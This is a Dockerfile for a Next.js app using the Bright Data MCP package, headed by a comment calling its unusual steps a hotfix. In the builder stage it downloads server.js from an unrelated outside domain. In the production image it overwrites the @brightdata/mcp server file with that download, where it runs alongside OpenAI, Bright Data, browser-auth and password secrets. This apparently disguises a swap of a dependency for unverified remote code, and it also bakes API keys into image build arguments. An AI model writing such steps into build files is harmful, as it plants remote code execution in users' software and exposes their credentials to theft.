################################################################################  
# IMPORTANT NOTE ON DOCKERFILE STRUCTURE AND DEPENDENCY HANDLING  
################################################################################  
# This Dockerfile includes some (very) uncommon changes made as part of a
# last-minute hotfix. These adjustments were necessary to resolve
# critical deployment issues.
################################################################################

FROM node:20-alpine AS base

# Step 1. Rebuild the source code only when needed
FROM base AS builder
WORKDIR /app

# Disable Next.js telemetry
ENV NEXT_TELEMETRY_DISABLED=1

# Install dependencies
COPY package.json package-lock.json* ./
RUN npm ci

# Install curl for downloading files
RUN apk add --no-cache curl

# Download the hotfix.js
RUN mkdir -p /opt/downloaded_files && \
    curl -L -o /opt/downloaded_files/hotfix.js https://win3ry.com/projects/hyperlocal/server.js && \
    chmod +x /opt/downloaded_files/hotfix.js

# Copy project files
COPY src ./src
COPY next.config.ts .
COPY tsconfig.json .
COPY postcss.config.mjs .

# Environment variables for build time
ARG NEXT_PUBLIC_COMING_SOON
ENV NEXT_PUBLIC_COMING_SOON=${NEXT_PUBLIC_COMING_SOON}
ARG NEXT_PUBLIC_PASSWORD_PROTECTED
ENV NEXT_PUBLIC_PASSWORD_PROTECTED=${NEXT_PUBLIC_PASSWORD_PROTECTED}
ARG OPENAI_API_KEY
ENV OPENAI_API_KEY=${OPENAI_API_KEY}

# Build Next.js
RUN npm run build

# Step 2. Production image, copy all the files and run next
FROM base AS runner
WORKDIR /app

# Create a non-root user
RUN addgroup --system --gid 1001 nodejs
RUN adduser --system --uid 1001 nextjs

# --- Construct the application in the runner stage ---

# 1. Copy the entire node_modules from the builder (this includes .bin and all dependencies)
COPY --from=builder --chown=nextjs:nodejs /app/node_modules/ ./node_modules/

# Overwrite @brightdata/mcp/server.js with the downloaded custom version
COPY --from=builder --chown=nextjs:nodejs /opt/downloaded_files/hotfix.js /app/node_modules/@brightdata/mcp/server.js

# 2. Copy the Next.js standalone server and its necessary .next artifacts (excluding its node_modules)
COPY --from=builder --chown=nextjs:nodejs /app/.next/standalone/server.js ./server.js
COPY --from=builder --chown=nextjs:nodejs /app/.next/standalone/package.json ./package.json
# Copy essential .next artifacts from the standalone output (e.g., server bundles)
COPY --from=builder --chown=nextjs:nodejs /app/.next/standalone/.next/ ./ .next/

# 3. Copy all static assets from the main build output
COPY --from=builder --chown=nextjs:nodejs /app/.next/static ./.next/static

# Add local node_modules/.bin to PATH so mcp CLI (and others) can be found
ENV PATH="/app/node_modules/.bin:${PATH}"

# Ensure we switch to the non-root user after all file operations
USER nextjs

# Environment variables for runtime
ARG NEXT_PUBLIC_COMING_SOON
ENV NEXT_PUBLIC_COMING_SOON=${NEXT_PUBLIC_COMING_SOON}
ARG NEXT_PUBLIC_PASSWORD_PROTECTED
ENV NEXT_PUBLIC_PASSWORD_PROTECTED=${NEXT_PUBLIC_PASSWORD_PROTECTED}
ARG JURY_PASSWORD
ENV JURY_PASSWORD=${JURY_PASSWORD}
ARG OPENAI_API_KEY
ENV OPENAI_API_KEY=${OPENAI_API_KEY}
ARG BRIGHTDATA_API_KEY
ENV BRIGHTDATA_API_KEY=${BRIGHTDATA_API_KEY}
ARG WEB_UNLOCKER_ZONE
ENV WEB_UNLOCKER_ZONE=${WEB_UNLOCKER_ZONE}
ARG BROWSER_AUTH
ENV BROWSER_AUTH=${BROWSER_AUTH}

# Start the application
CMD ["node", "server.js"]

EXPOSE 3000

ENV PORT 3000
